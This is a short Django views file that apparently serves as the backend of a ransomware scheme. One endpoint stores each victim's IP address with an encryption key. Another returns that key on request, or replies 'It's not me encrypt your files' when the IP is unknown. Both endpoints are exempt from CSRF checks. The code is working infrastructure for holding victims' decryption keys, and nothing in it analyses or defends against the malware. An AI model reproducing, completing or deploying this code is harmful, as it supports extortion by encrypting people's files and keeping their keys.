from django.shortcuts import HttpResponse
from django.views.decorators.csrf import csrf_exempt
from .forms import KeyForm, IpForm
from .models import Key
from django.db.models import Q

# Create your views here.
@csrf_exempt
# This function saves ip and key 
def key(request):
	if request.method == 'POST':
		form = KeyForm(request.POST)
		# If form is valid: save ip and key in database
		if form.is_valid():
			obj = Key()
			obj.key_text = form.cleaned_data['key_text']
			obj.key_ip = form.cleaned_data['key_ip']
			# Check if ip already in database and delete past ip/key pair
			q = Key.objects.filter(Q(key_ip__icontains = obj.key_ip))
			q.delete()
			obj.save()
			return HttpResponse('/')

@csrf_exempt
# Send key to ip
def give_keys(request):
	# Create dictionary with ip and keys from database
	key_list = {}
	for item in Key.objects.all():
		key_list[item.key_ip] = item.key_text
	if request.method == 'POST':
		form = IpForm(request.POST)
		if form.is_valid():
			ip_to_decrypt = form.cleaned_data['ip_to_decrypt']
			# If ip in dictionary: give key
			if ip_to_decrypt in key_list:
				return HttpResponse(key_list[ip_to_decrypt])
			else:
				return HttpResponse("It's not me encrypt your files")
	